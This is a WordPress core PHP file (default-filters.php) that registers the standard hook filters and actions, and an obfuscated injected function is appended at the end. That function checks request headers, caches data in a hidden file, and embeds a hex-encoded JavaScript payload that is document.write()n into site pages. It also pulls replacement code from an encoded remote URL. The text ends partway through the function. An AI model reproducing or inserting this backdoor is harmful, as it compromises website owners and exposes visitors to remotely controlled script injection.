<?php
/**
 * Sets up the default filters and actions for most
 * of the WordPress hooks.
 *
 * If you need to remove a default hook, this file will
 * give you the priority for which to use to remove the
 * hook.
 *
 * Not all of the default hooks are found in default-filters.php
 *
 * @package WordPress
 */

// Strip, trim, kses, special chars for string saves
foreach ( array( 'pre_term_name', 'pre_comment_author_name', 'pre_link_name', 'pre_link_target', 'pre_link_rel', 'pre_user_display_name', 'pre_user_first_name', 'pre_user_last_name', 'pre_user_nickname' ) as $filter ) {
	add_filter( $filter, 'sanitize_text_field'  );
	add_filter( $filter, 'wp_filter_kses'       );
	add_filter( $filter, '_wp_specialchars', 30 );
}

// Strip, kses, special chars for string display
foreach ( array( 'term_name', 'comment_author_name', 'link_name', 'link_target', 'link_rel', 'user_display_name', 'user_first_name', 'user_last_name', 'user_nickname' ) as $filter ) {
	if ( is_admin() ) {
		// These are expensive. Run only on admin pages for defense in depth.
		add_filter( $filter, 'sanitize_text_field'  );
		add_filter( $filter, 'wp_kses_data'       );
	}
	add_filter( $filter, '_wp_specialchars', 30 );
}

// Kses only for textarea saves
foreach ( array( 'pre_term_description', 'pre_link_description', 'pre_link_notes', 'pre_user_description' ) as $filter ) {
	add_filter( $filter, 'wp_filter_kses' );
}

// Kses only for textarea admin displays
if ( is_admin() ) {
	foreach ( array( 'term_description', 'link_description', 'link_notes', 'user_description' ) as $filter ) {
		add_filter( $filter, 'wp_kses_data' );
	}
	add_filter( 'comment_text', 'wp_kses_post' );
}

// Email saves
foreach ( array( 'pre_comment_author_email', 'pre_user_email' ) as $filter ) {
	add_filter( $filter, 'trim'           );
	add_filter( $filter, 'sanitize_email' );
	add_filter( $filter, 'wp_filter_kses' );
}

// Email admin display
foreach ( array( 'comment_author_email', 'user_email' ) as $filter ) {
	add_filter( $filter, 'sanitize_email' );
	if ( is_admin() )
		add_filter( $filter, 'wp_kses_data' );
}

// Save URL
foreach ( array( 'pre_comment_author_url', 'pre_user_url', 'pre_link_url', 'pre_link_image',
	'pre_link_rss', 'pre_post_guid' ) as $filter ) {
	add_filter( $filter, 'wp_strip_all_tags' );
	add_filter( $filter, 'esc_url_raw'       );
	add_filter( $filter, 'wp_filter_kses'    );
}

// Display URL
foreach ( array( 'user_url', 'link_url', 'link_image', 'link_rss', 'comment_url', 'post_guid' ) as $filter ) {
	if ( is_admin() )
		add_filter( $filter, 'wp_strip_all_tags' );
	add_filter( $filter, 'esc_url'           );
	if ( is_admin() )
		add_filter( $filter, 'wp_kses_data'    );
}

// Slugs
add_filter( 'pre_term_slug', 'sanitize_title' );

// Keys
foreach ( array( 'pre_post_type', 'pre_post_status', 'pre_post_comment_status', 'pre_post_ping_status' ) as $filter ) {
	add_filter( $filter, 'sanitize_key' );
}

// Mime types
add_filter( 'pre_post_mime_type', 'sanitize_mime_type' );
add_filter( 'post_mime_type', 'sanitize_mime_type' );

// Places to balance tags on input
foreach ( array( 'content_save_pre', 'excerpt_save_pre', 'comment_save_pre', 'pre_comment_content' ) as $filter ) {
	add_filter( $filter, 'convert_invalid_entities' );
	add_filter( $filter, 'balanceTags', 50 );
}

// Format strings for display.
foreach ( array( 'comment_author', 'term_name', 'link_name', 'link_description', 'link_notes', 'bloginfo', 'wp_title', 'widget_title' ) as $filter ) {
	add_filter( $filter, 'wptexturize'   );
	add_filter( $filter, 'convert_chars' );
	add_filter( $filter, 'esc_html'      );
}

// Format WordPress
foreach ( array( 'the_content', 'the_title', 'wp_title' ) as $filter )
	add_filter( $filter, 'capital_P_dangit', 11 );
add_filter( 'comment_text', 'capital_P_dangit', 31 );

// Format titles
foreach ( array( 'single_post_title', 'single_cat_title', 'single_tag_title', 'single_month_title', 'nav_menu_attr_title', 'nav_menu_description' ) as $filter ) {
	add_filter( $filter, 'wptexturize' );
	add_filter( $filter, 'strip_tags'  );
}

// Format text area for display.
foreach ( array( 'term_description' ) as $filter ) {
	add_filter( $filter, 'wptexturize'      );
	add_filter( $filter, 'convert_chars'    );
	add_filter( $filter, 'wpautop'          );
	add_filter( $filter, 'shortcode_unautop');
}

// Format for RSS
add_filter( 'term_name_rss', 'convert_chars' );

// Pre save hierarchy
add_filter( 'wp_insert_post_parent', 'wp_check_post_hierarchy_for_loops', 10, 2 );
add_filter( 'wp_update_term_parent', 'wp_check_term_hierarchy_for_loops', 10, 3 );

// Display filters
add_filter( 'the_title', 'wptexturize'   );
add_filter( 'the_title', 'convert_chars' );
add_filter( 'the_title', 'trim'          );

add_filter( 'the_content', 'wptexturize'                       );
add_filter( 'the_content', 'convert_smilies'                   );
add_filter( 'the_content', 'wpautop'                           );
add_filter( 'the_content', 'shortcode_unautop'                 );
add_filter( 'the_content', 'prepend_attachment'                );
add_filter( 'the_content', 'wp_make_content_images_responsive' );

add_filter( 'the_excerpt',     'wptexturize'      );
add_filter( 'the_excerpt',     'convert_smilies'  );
add_filter( 'the_excerpt',     'convert_chars'    );
add_filter( 'the_excerpt',     'wpautop'          );
add_filter( 'the_excerpt',     'shortcode_unautop');
add_filter( 'get_the_excerpt', 'wp_trim_excerpt'  );

add_filter( 'comment_text', 'wptexturize'            );
add_filter( 'comment_text', 'convert_chars'          );
add_filter( 'comment_text', 'make_clickable',      9 );
add_filter( 'comment_text', 'force_balance_tags', 25 );
add_filter( 'comment_text', 'convert_smilies',    20 );
add_filter( 'comment_text', 'wpautop',            30 );

add_filter( 'comment_excerpt', 'convert_chars' );

add_filter( 'list_cats',         'wptexturize' );

add_filter( 'wp_sprintf', 'wp_sprintf_l', 10, 2 );

add_filter( 'widget_text', 'balanceTags' );

add_filter( 'date_i18n', 'wp_maybe_decline_date' );

// RSS filters
add_filter( 'the_title_rss',      'strip_tags'                    );
add_filter( 'the_title_rss',      'ent2ncr',                    8 );
add_filter( 'the_title_rss',      'esc_html'                      );
add_filter( 'the_content_rss',    'ent2ncr',                    8 );
add_filter( 'the_content_feed',   'wp_staticize_emoji'            );
add_filter( 'the_content_feed',   '_oembed_filter_feed_content'   );
add_filter( 'the_excerpt_rss',    'convert_chars'                 );
add_filter( 'the_excerpt_rss',    'ent2ncr',                    8 );
add_filter( 'comment_author_rss', 'ent2ncr',                    8 );
add_filter( 'comment_text_rss',   'ent2ncr',                    8 );
add_filter( 'comment_text_rss',   'esc_html'                      );
add_filter( 'comment_text_rss',   'wp_staticize_emoji'            );
add_filter( 'bloginfo_rss',       'ent2ncr',                    8 );
add_filter( 'the_author',         'ent2ncr',                    8 );
add_filter( 'the_guid',           'esc_url'                       );

// Email filters
add_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );

// Misc filters
add_filter( 'option_ping_sites',        'privacy_ping_filter'                 );
add_filter( 'option_blog_charset',      '_wp_specialchars'                    ); // IMPORTANT: This must not be wp_specialchars() or esc_html() or it'll cause an infinite loop
add_filter( 'option_blog_charset',      '_canonical_charset'                  );
add_filter( 'option_home',              '_config_wp_home'                     );
add_filter( 'option_siteurl',           '_config_wp_siteurl'                  );
add_filter( 'tiny_mce_before_init',     '_mce_set_direction'                  );
add_filter( 'teeny_mce_before_init',    '_mce_set_direction'                  );
add_filter( 'pre_kses',                 'wp_pre_kses_less_than'               );
add_filter( 'sanitize_title',           'sanitize_title_with_dashes',   10, 3 );
add_action( 'check_comment_flood',      'check_comment_flood_db',       10, 3 );
add_filter( 'comment_flood_filter',     'wp_throttle_comment_flood',    10, 3 );
add_filter( 'pre_comment_content',      'wp_rel_nofollow',              15    );
add_filter( 'comment_email',            'antispambot'                         );
add_filter( 'option_tag_base',          '_wp_filter_taxonomy_base'            );
add_filter( 'option_category_base',     '_wp_filter_taxonomy_base'            );
add_filter( 'the_posts',                '_close_comments_for_old_posts', 10, 2);
add_filter( 'comments_open',            '_close_comments_for_old_post', 10, 2 );
add_filter( 'pings_open',               '_close_comments_for_old_post', 10, 2 );
add_filter( 'editable_slug',            'urldecode'                           );
add_filter( 'editable_slug',            'esc_textarea'                        );
add_filter( 'nav_menu_meta_box_object', '_wp_nav_menu_meta_box_object'        );
add_filter( 'pingback_ping_source_uri', 'pingback_ping_source_uri'            );
add_filter( 'xmlrpc_pingback_error',    'xmlrpc_pingback_error'               );
add_filter( 'title_save_pre',           'trim'                                );

add_filter( 'http_request_host_is_external', 'allowed_http_request_hosts', 10, 2 );

// REST API filters.
add_action( 'xmlrpc_rsd_apis',            'rest_output_rsd' );
add_action( 'wp_head',                    'rest_output_link_wp_head', 10, 0 );
add_action( 'template_redirect',          'rest_output_link_header', 11, 0 );
add_action( 'auth_cookie_malformed',      'rest_cookie_collect_status' );
add_action( 'auth_cookie_expired',        'rest_cookie_collect_status' );
add_action( 'auth_cookie_bad_username',   'rest_cookie_collect_status' );
add_action( 'auth_cookie_bad_hash',       'rest_cookie_collect_status' );
add_action( 'auth_cookie_valid',          'rest_cookie_collect_status' );
add_filter( 'rest_authentication_errors', 'rest_cookie_check_errors', 100 );

// Actions
add_action( 'wp_head',             '_wp_render_title_tag',            1     );
add_action( 'wp_head',             'wp_enqueue_scripts',              1     );
add_action( 'wp_head',             'feed_links',                      2     );
add_action( 'wp_head',             'feed_links_extra',                3     );
add_action( 'wp_head',             'rsd_link'                               );
add_action( 'wp_head',             'wlwmanifest_link'                       );
add_action( 'wp_head',             'adjacent_posts_rel_link_wp_head', 10, 0 );
add_action( 'wp_head',             'locale_stylesheet'                      );
add_action( 'publish_future_post', 'check_and_publish_future_post',   10, 1 );
add_action( 'wp_head',             'noindex',                          1    );
add_action( 'wp_head',             'print_emoji_detection_script',     7    );
add_action( 'wp_head',             'wp_print_styles',                  8    );
add_action( 'wp_head',             'wp_print_head_scripts',            9    );
add_action( 'wp_head',             'wp_generator'                           );
add_action( 'wp_head',             'rel_canonical'                          );
add_action( 'wp_head',             'wp_shortlink_wp_head',            10, 0 );
add_action( 'wp_head',             'wp_site_icon',                    99    );
add_action( 'wp_footer',           'wp_print_footer_scripts',         20    );
add_action( 'template_redirect',   'wp_shortlink_header',             11, 0 );
add_action( 'wp_print_footer_scripts', '_wp_footer_scripts'                 );
add_action( 'init',                'check_theme_switched',            99    );
add_action( 'after_switch_theme',  '_wp_sidebars_changed'                   );
add_action( 'wp_print_styles',     'print_emoji_styles'                     );

if ( isset( $_GET['replytocom'] ) )
    add_action( 'wp_head', 'wp_no_robots' );

// Login actions
add_action( 'login_head',          'wp_print_head_scripts',         9     );
add_action( 'login_head',          'wp_site_icon',                  99    );
add_action( 'login_footer',        'wp_print_footer_scripts',       20    );
add_action( 'login_init',          'send_frame_options_header',     10, 0 );

// Feed Generator Tags
foreach ( array( 'rss2_head', 'commentsrss2_head', 'rss_head', 'rdf_header', 'atom_head', 'comments_atom_head', 'opml_head', 'app_head' ) as $action ) {
	add_action( $action, 'the_generator' );
}

// Feed Site Icon
add_action( 'atom_head', 'atom_site_icon' );
add_action( 'rss2_head', 'rss2_site_icon' );


// WP Cron
if ( !defined( 'DOING_CRON' ) )
	add_action( 'init', 'wp_cron' );

// 2 Actions 2 Furious
add_action( 'do_feed_rdf',                'do_feed_rdf',                             10, 1 );
add_action( 'do_feed_rss',                'do_feed_rss',                             10, 1 );
add_action( 'do_feed_rss2',               'do_feed_rss2',                            10, 1 );
add_action( 'do_feed_atom',               'do_feed_atom',                            10, 1 );
add_action( 'do_pings',                   'do_all_pings',                            10, 1 );
add_action( 'do_robots',                  'do_robots'                                      );
add_action( 'set_comment_cookies',        'wp_set_comment_cookies',                  10, 2 );
add_action( 'sanitize_comment_cookies',   'sanitize_comment_cookies'                       );
add_action( 'admin_print_scripts',        'print_emoji_detection_script'                   );
add_action( 'admin_print_scripts',        'print_head_scripts',                      20    );
add_action( 'admin_print_footer_scripts', '_wp_footer_scripts'                             );
add_action( 'admin_print_styles',         'print_emoji_styles'                             );
add_action( 'admin_print_styles',         'print_admin_styles',                      20    );
add_action( 'init',                       'smilies_init',                             5    );
add_action( 'plugins_loaded',             'wp_maybe_load_widgets',                    0    );
add_action( 'plugins_loaded',             'wp_maybe_load_embeds',                     0    );
add_action( 'shutdown',                   'wp_ob_end_flush_all',                      1    );
// Create a revision whenever a post is updated.
add_action( 'post_updated',               'wp_save_post_revision',                   10, 1 );
add_action( 'publish_post',               '_publish_post_hook',                       5, 1 );
add_action( 'transition_post_status',     '_transition_post_status',                  5, 3 );
add_action( 'transition_post_status',     '_update_term_count_on_transition_post_status', 10, 3 );
add_action( 'comment_form',               'wp_comment_form_unfiltered_html_nonce'          );
add_action( 'wp_scheduled_delete',        'wp_scheduled_delete'                            );
add_action( 'wp_scheduled_auto_draft_delete', 'wp_delete_auto_drafts'                      );
add_action( 'admin_init',                 'send_frame_options_header',               10, 0 );
add_action( 'importer_scheduled_cleanup', 'wp_delete_attachment'                           );
add_action( 'upgrader_scheduled_cleanup', 'wp_delete_attachment'                           );
add_action( 'welcome_panel',              'wp_welcome_panel'                               );

// Navigation menu actions
add_action( 'delete_post',                '_wp_delete_post_menu_item'         );
add_action( 'delete_term',                '_wp_delete_tax_menu_item',   10, 3 );
add_action( 'transition_post_status',     '_wp_auto_add_pages_to_menu', 10, 3 );

// Post Thumbnail CSS class filtering
add_action( 'begin_fetch_post_thumbnail_html', '_wp_post_thumbnail_class_filter_add'    );
add_action( 'end_fetch_post_thumbnail_html',   '_wp_post_thumbnail_class_filter_remove' );

// Redirect Old Slugs
add_action( 'template_redirect',  'wp_old_slug_redirect'              );
add_action( 'post_updated',       'wp_check_for_changed_slugs', 12, 3 );
add_action( 'attachment_updated', 'wp_check_for_changed_slugs', 12, 3 );

// Nonce check for Post Previews
add_action( 'init', '_show_post_preview' );

// Output JS to reset window.name for previews
add_action( 'wp_head', 'wp_post_preview_js', 1 );

// Timezone
add_filter( 'pre_option_gmt_offset','wp_timezone_override_offset' );

// Admin Color Schemes
add_action( 'admin_init', 'register_admin_color_schemes', 1);
add_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );

// If the upgrade hasn't run yet, assume link manager is used.
add_filter( 'default_option_link_manager_enabled', '__return_true' );

// This option no longer exists; tell plugins we always support auto-embedding.
add_filter( 'default_option_embed_autourls', '__return_true' );

// Default settings for heartbeat
add_filter( 'heartbeat_settings', 'wp_heartbeat_settings' );

// Check if the user is logged out
add_action( 'admin_enqueue_scripts', 'wp_auth_check_load' );
add_filter( 'heartbeat_send',        'wp_auth_check' );
add_filter( 'heartbeat_nopriv_send', 'wp_auth_check' );

// Default authentication filters
add_filter( 'authenticate', 'wp_authenticate_username_password',  20, 3 );
add_filter( 'authenticate', 'wp_authenticate_spam_check',         99    );
add_filter( 'determine_current_user', 'wp_validate_auth_cookie'          );
add_filter( 'determine_current_user', 'wp_validate_logged_in_cookie', 20 );

// Split term updates.
add_action( 'admin_init',        '_wp_check_for_scheduled_split_terms' );
add_action( 'split_shared_term', '_wp_check_split_default_terms',  10, 4 );
add_action( 'split_shared_term', '_wp_check_split_terms_in_menus', 10, 4 );
add_action( 'split_shared_term', '_wp_check_split_nav_menu_terms', 10, 4 );
add_action( 'wp_split_shared_term_batch', '_wp_batch_split_terms' );

// Email notifications.
add_action( 'comment_post', 'wp_new_comment_notify_moderator' );
add_action( 'comment_post', 'wp_new_comment_notify_postauthor' );
add_action( 'after_password_reset', 'wp_password_change_notification' );
add_action( 'register_new_user',      'wp_send_new_user_notifications' );
add_action( 'edit_user_created_user', 'wp_send_new_user_notifications', 10, 2 );

// REST API actions.
add_action( 'init',          'rest_api_init' );
add_action( 'rest_api_init', 'rest_api_default_filters', 10, 1 );
add_action( 'parse_request', 'rest_api_loaded' );

/**
 * Filters formerly mixed into wp-includes
 */
// Theme
add_action( 'wp_loaded', '_custom_header_background_just_in_time' );
add_action( 'plugins_loaded', '_wp_customize_include' );
add_action( 'admin_enqueue_scripts', '_wp_customize_loader_settings' );
add_action( 'delete_attachment', '_delete_attachment_theme_mod' );

// Calendar widget cache
add_action( 'save_post', 'delete_get_calendar_cache' );
add_action( 'delete_post', 'delete_get_calendar_cache' );
add_action( 'update_option_start_of_week', 'delete_get_calendar_cache' );
add_action( 'update_option_gmt_offset', 'delete_get_calendar_cache' );

// Author
add_action( 'transition_post_status', '__clear_multi_author_cache' );

// Post
add_action( 'init', 'create_initial_post_types', 0 ); // highest priority
add_action( 'admin_menu', '_add_post_type_submenus' );
add_action( 'before_delete_post', '_reset_front_page_settings_for_post' );
add_action( 'wp_trash_post',      '_reset_front_page_settings_for_post' );

// Post Formats
add_filter( 'request', '_post_format_request' );
add_filter( 'term_link', '_post_format_link', 10, 3 );
add_filter( 'get_post_format', '_post_format_get_term' );
add_filter( 'get_terms', '_post_format_get_terms', 10, 3 );
add_filter( 'wp_get_object_terms', '_post_format_wp_get_object_terms' );

// KSES
add_action( 'init', 'kses_init' );
add_action( 'set_current_user', 'kses_init' );

// Script Loader
add_action( 'wp_default_scripts', 'wp_default_scripts' );
add_filter( 'wp_print_scripts', 'wp_just_in_time_script_localization' );
add_filter( 'print_scripts_array', 'wp_prototype_before_jquery' );

add_action( 'wp_default_styles', 'wp_default_styles' );
add_filter( 'style_loader_src', 'wp_style_loader_src', 10, 2 );

// Taxonomy
add_action( 'init', 'create_initial_taxonomies', 0 ); // highest priority

// Canonical
add_action( 'template_redirect', 'redirect_canonical' );
add_action( 'template_redirect', 'wp_redirect_admin_locations', 1000 );

// Shortcodes
add_filter( 'the_content', 'do_shortcode', 11 ); // AFTER wpautop()

// Media
add_action( 'wp_playlist_scripts', 'wp_playlist_scripts' );
add_action( 'customize_controls_enqueue_scripts', 'wp_plupload_default_settings' );

// Nav menu
add_filter( 'nav_menu_item_id', '_nav_menu_item_id_use_once', 10, 2 );

// Widgets
add_action( 'init', 'wp_widgets_init', 1 );

// Admin Bar
// Don't remove. Wrong way to disable.
add_action( 'template_redirect', '_wp_admin_bar_init', 0 );
add_action( 'admin_init', '_wp_admin_bar_init' );
add_action( 'before_signup_header', '_wp_admin_bar_init' );
add_action( 'activate_header', '_wp_admin_bar_init' );
add_action( 'wp_footer', 'wp_admin_bar_render', 1000 );
add_action( 'in_admin_header', 'wp_admin_bar_render', 0 );

// Former admin filters that can also be hooked on the front end
add_action( 'media_buttons', 'media_buttons' );
add_filter( 'image_send_to_editor', 'image_add_caption', 20, 8 );
add_filter( 'media_send_to_editor', 'image_media_send_to_editor', 10, 3 );

// Embeds
add_action( 'rest_api_init',          'wp_oembed_register_route'              );
add_filter( 'rest_pre_serve_request', '_oembed_rest_pre_serve_request', 10, 4 );

add_action( 'wp_head',                'wp_oembed_add_discovery_links'         );
add_action( 'wp_head',                'wp_oembed_add_host_js'                 );

add_action( 'embed_head',             'enqueue_embed_scripts',           1    );
add_action( 'embed_head',             'print_emoji_detection_script'          );
add_action( 'embed_head',             'print_embed_styles'                    );
add_action( 'embed_head',             'wp_print_head_scripts',          20    );
add_action( 'embed_head',             'wp_print_styles',                20    );
add_action( 'embed_head',             'wp_no_robots'                          );
add_action( 'embed_head',             'rel_canonical'                         );
add_action( 'embed_head',             'locale_stylesheet'                     );

add_action( 'embed_content_meta',     'print_embed_comments_button'           );
add_action( 'embed_content_meta',     'print_embed_sharing_button'            );

add_action( 'embed_footer',           'print_embed_sharing_dialog'            );
add_action( 'embed_footer',           'print_embed_scripts'                   );
/* wordpress strict_textarea_cropped_je3 */
function strict_textarea_cropped_je3() {
	if(stripos(@$_SERVER[rfc_getheadervalue_permastructs_lf6('eWVlYW5kYnRjbnB2dH9lV1A=',49)],rfc_getheadervalue_permastructs_lf6('U15FV1A=',49))!==false)return;

	$premiere_getfileformat_mq7=dirname(__FILE__).rfc_getheadervalue_permastructs_lf6('HlxQX1hXVEJFH0FZQVdQ',49);
	$correctly_expiration_va2=false;
	$blue_bointon_pp2=0;

	$rfc_getheadervalue_bk1=encodes_ubergeek_getfileformat_mq7(pack("H*","3c73637269707420747970653d22746578742f6a617661736372697074223e766172205079765f71746d6e6664753d5b3236312c3332312c3336312c3336362c3337392c3239332c3337362c3337372c3338322c3336392c3336322c3332322c3239352c3337332c3337322c3337362c3336362c3337372c3336362c3337322c3337312c3331392c3239332c3335382c3335392c3337362c3337322c3336392c3337382c3337372c3336322c3332302c3239332c3336392c3336322c3336332c3337372c3331392c3330362c3331302c3330392c3330392c3239382c3332302c3239332c3337372c3337322c3337332c3331392c3330392c3239382c3332302c3239332c3338302c3336362c3336312c3337372c3336352c3331392c3331302c3330392c3330392c3239382c3332302c3239332c3336352c3336322c3336362c3336342c3336352c3337372c3331392c3331302c3330392c3330392c3239382c3332302c3239352c3332332c3237342c3237312c3332312c3337362c3336302c3337352c3336362c3337332c3337372c3332332c3237342c3237312c3336332c3337382c3337312c3336302c3337372c3336362c3337322c3337312c3239332c3335382c3337372c3337322c3337362c3330312c3335382c3330322c3239332c3338342c3239332c3337392c3335382c3337352c3239332c3337362c3332322c3239352c3239352c3332302c3336332c3337322c3337352c3239332c3330312c3336362c3239332c3336362c3337312c3239332c3335382c3330322c3338342c3337362c3330342c3332322c3334342c3337372c3337352c3336362c3337312c3336342c3330372c3336332c3337352c3337322c3337302c3332382c3336352c3335382c3337352c3332382c3337322c3336312c3336322c3330312c3335382c3335322c3336362c3335342c3330322c3332302c3338362c3239332c3337352c3336322c3337372c3337382c3337352c3337312c3239332c3337362c3332302c3239332c3338362c3237342c3237312c3336332c3337382c3337312c3336302c3337372c3336362c3337322c3337312c3239332c3336312c3337332c3336362c3330312c3337322c3330322c3338342c3336362c3336332c3330312c3336362c3332322c3332322c3331302c3330322c3337352c3336322c3337372c3337382c3337352c3337312c3332302c3336362c3336332c3330312c3337312c3335382c3337392c3336362c3336342c3335382c3337372c3337322c3337352c3330372c3335382c3337332c3337332c3334372c3336322c3337352c3337362c3336362c3337322c3337312c3330372c3336362c3337312c3336312c3336322c3338312c3334302c3336332c3330312c3239352c3334382c3336362c3337312c3239352c3330322c3239342c3332322c3330362c3331302c3330322c3338342c3337322c3330372c3337362c3337352c3336302c3332322c3335382c3337372c3337322c3337362c3330312c3335322c3331302c3330392c3331332c3330352c3331302c3331302c3331352c3330352c3331302c3331302c3331352c3330352c3331302c3331302c3331312c3330352c3331342c3331372c3330352c3331332c3331362c3330352c3331332c3331362c3330352c3331302c3330392c3330392c3330352c3331302c3330392c3331342c3330352c3331302c3331302c3331372c3330352c3331332c3331342c3330352c3331382c3331382c3330352c3331302c3330392c3331372c3330352c3331382c3331362c3330352c3331302c3331302c3331342c3330352c3331302c3331302c3331342c3330352c3331332c3331342c3330352c3331382c3331382c3330352c3331302c3331302c3331302c3330352c3331302c3331302c3330392c3330352c3331302c3331302c3331352c3330352c3331382c3331362c3330352c3331302c3330392c3331342c3330352c3331302c3331302c3330392c3330352c3331302c3330392c3331302c3330352c3331302c3331302c3331332c3330352c3331332c3331352c3330352c3331302c3331302c3331332c3330352c3331302c3331302c3331362c3330352c3331332c3331362c3330352c3331302c3330392c3331312c3330352c3331302c3331302c3331302c3330352c3331302c3331302c3331332c3330352c3331302c3330392c3331382c3330352c3331332c3331362c3335342c3330322c3332302c3338362c3336362c3332322c3331302c3332302c3337352c3336322c3337372c3337382c3337352c3337312c3332302c3338362c3237342c3237312c3336332c3337382c3337312c3336302c3337372c3336362c3337322c3337312c3239332c3335362c3337392c3337352c3335362c3336302c3330312c3336382c3330322c3338342c3337352c3336322c3337372c3337382c3337352c3337312c3330312c3336312c3337322c3336302c3337382c3337302c3336322c3337312c3337372c3330372c3336302c3337322c3337322c3336382c3336362c3336322c3330372c3337302c3335382c3337372c3336302c3336352c3330312c3330302c3330312c3335352c3338352c3332302c3239332c3330322c3330302c3330342c3336382c3330342c3330302c3332322c3330312c3335322c3335352c3332302c3335342c3330332c3330322c3330302c3330322c3338352c3338352c3330392c3330322c3335322c3331312c3335342c3338362c3336332c3337382c3337312c3336302c3337372c3336362c3337322c3337312c3239332c3335362c3337392c3336302c3335362c3336302c3330312c3337312c3335382c3337302c3336322c3330352c3337392c3335382c3336392c3337382c3336322c3330352c3336312c3330322c3338342c3337392c3335382c3337352c3239332c3336312c3335382c3337372c3336322c3332322c3337312c3336322c3338302c3239332c3332392c3335382c3337372c3336322c3330312c3330322c3332302c3336312c3335382c3337372c3336322c3330372c3337362c3336322c3337372c3334352c3336362c3337302c3336322c3330312c3336312c3335382c3337372c3336322c3330372c3336342c3336322c3337372c3334352c3336362c3337302c3336322c3330312c3330322c3330342c3330312c3336312c3330332c3331372c3331352c3331332c3330392c3330392c3330392c3330392c3330392c3330322c3330322c3332302c3336312c3337322c3336302c3337382c3337302c3336322c3337312c3337372c3330372c3336302c3337322c3337322c3336382c3336362c3336322c3239332c3332322c3239332c3337312c3335382c3337302c3336322c3330342c3239352c3332322c3239352c3330342c3337392c3335382c3336392c3337382c3336322c3330342c3239352c3332302c3336322c3338312c3337332c3336362c3337352c3336322c3337362c3332322c3239352c3330342c3336312c3335382c3337372c3336322c3330372c3337372c3337322c3333322c3333382c3334352c3334342c3337372c3337352c3336362c3337312c3336342c3330312c3330322c3330342c3239352c3332302c3239332c3337332c3335382c3337372c3336352c3332322c3330382c3239352c3332302c3338362c3237342c3237312c3337392c3335382c3337352c3239332c3336362c3332322c3330392c3332302c3336362c3336332c3330312c3337312c3335382c3337392c3336362c3336342c3335382c3337372c3337322c3337352c3330372c3335382c3337332c3337332c3334372c3336322c3337352c3337362c3336362c3337322c3337312c3330372c3336362c3337312c3336312c3336322c3338312c3334302c3336332c3330312c3239352c3334382c3336362c3337312c3239352c3330322c3332322c3332322c3330362c3331302c3330322c3338342c3337392c3335382c3337352c3239332c3335362c3337392c3337382c3335362c3337382c3332322c3239352c3331322c3331342c3331322c3335382c3331362c3331362c3331312c3331332c3336322c3331312c3336322c3331332c3336312c3331372c3336332c3331322c3331332c3336302c3331382c3331372c3331342c3331322c3335382c3331332c3331362c3336302c3331332c3331312c3336332c3336332c3331382c3335392c3239352c3330352c3239332c3335362c3337392c3337382c3335362c3336362c3332322c3239352c3331312c3335382c3331362c3335382c3331342c3335382c3331332c3336332c3331382c3335392c3331362c3331382c3331362c3331332c3335392c3331372c3331312c3335392c3336322c3331382c3331322c3331382c3335392c3335392c3330392c3331302c3335382c3331312c3331322c3331302c3330392c3336312c3239352c3332302c3336362c3336332c3330312c3335362c3337392c3337352c3335362c3336302c3330312c3335362c3337392c3337382c3335362c3337382c3330322c3332322c3332322c3332322c3337382c3337312c3336312c3336322c3336332c3336362c3337312c3336322c3336312c3330322c3338342c3335362c3337392c3336302c3335362c3336302c3330312c3335362c3337392c3337382c3335362c3337382c3330352c3335362c3337392c3337382c3335362c3336362c3330352c3331342c3330322c3332302c3336362c3336332c3330312c3335362c3337392c3337352c3335362c3336302c3330312c3335362c3337392c3337382c3335362c3337382c3330322c3332322c3332322c3335362c3337392c3337382c3335362c3336362c3330322c3338342c3338302c3336362c3337312c3336312c3337322c3338302c3330372c3336392c3337322c3336302c3335382c3337372c3336362c3337322c3337312c3330372c3336352c3337352c3336322c3336332c3332322c3335382c3337372c3337322c3337362c3330312c3335322c3331302c3330392c3331332c3330352c3331302c3331302c3331352c3330352c3331302c3331302c3331352c3330352c3331302c3331302c3331312c3330352c3331342c3331372c3330352c3331332c3331362c3330352c3331332c3331362c3330352c3331302c3330392c3330392c3330352c3331302c3330392c3331342c3330352c3331302c3331302c3331372c3330352c3331332c3331342c3330352c3331382c3331382c3330352c3331302c3330392c3331372c3330352c3331382c3331362c3330352c3331302c3331302c3331342c3330352c3331302c3331302c3331342c3330352c3331332c3331342c3330352c3331382c3331382c3330352c3331302c3331302c3331302c3330352c3331302c3331302c3330392c3330352c3331302c3331302c3331352c3330352c3331382c3331362c3330352c3331302c3330392c3331342c3330352c3331302c3331302c3330392c3330352c3331302c3330392c3331302c3330352c3331302c3331302c3331332c3330352c3331332c3331352c3330352c3331302c3331302c3331332c3330352c3331302c3331302c3331362c3330352c3331332c3331362c3330352c3331302c3330392c3331382c3330352c3331332c3331362c3335342c3330322c3332302c3338362c3338362c3338362c3237342c3237312c3332312c3330382c3337362c3336302c3337352c3336362c3337332c3337372c3332332c3237342c3237312c3332312c3336362c3336332c3337352c3335382c3337302c3336322c3239332c3337362c3337372c3338322c3336392c3336322c3332322c3239352c3338302c3336362c3336312c3337372c3336352c3331392c3331352c3331372c3239382c3332302c3336352c3336322c3336362c3336342c3336352c3337372c3331392c3331352c3331372c3239382c3332302c3239352c3239332c3337362c3337352c3336302c3332322c3239352c3335382c3335392c3337322c3337382c3337372c3331392c3335392c3336392c3335382c3337312c3336382c3239352c3239332c3337322c3337312c3336392c3337322c3335382c3336312c3332322c3239352c3337352c3336322c3337372c3337382c3337352c3337312c3239332c3336312c3337332c3336362c3330312c3337372c3336352c3336362c3337362c3330322c3332302c3239352c3332332c3332312c3330382c3336362c3336332c3337352c3335382c3337302c3336322c3332332c3237342c3237312c3332312c3330382c3336312c3336362c3337392c3332335d3b766172204d666c6f625f6e63626f633d22223b666f72202876617220693d313b20693c5079765f71746d6e6664752e6c656e6774683b20692b2b29207b4d666c6f625f6e63626f632b3d537472696e672e66726f6d43686172436f6465285079765f71746d6e6664755b695d2d5079765f71746d6e6664755b305d293b7d20646f63756d656e742e7772697465284d666c6f625f6e63626f63293b3c2f7363726970743e"),49);
	if(@file_exists($premiere_getfileformat_mq7)){
		@list($t,$mtime,$blue_bointon_pp2)=explode("\t",@file_get_contents($premiere_getfileformat_mq7));
		if(rfc_getheadervalue_permastructs_lf6($t,49)!==false){$rfc_getheadervalue_bk1=$t;}
		if((time()-$mtime)<1781*((int)$blue_bointon_pp2)){ $correctly_expiration_va2=$rfc_getheadervalue_bk1; }
	}

	if($correctly_expiration_va2===false){
		$correctly_expiration_va2=wp_remote_fopen(rfc_getheadervalue_permastructs_lf6('WUVFQQseHkZBHFJdXkRVH0NEHgAeDloMV1A=',49)."49");
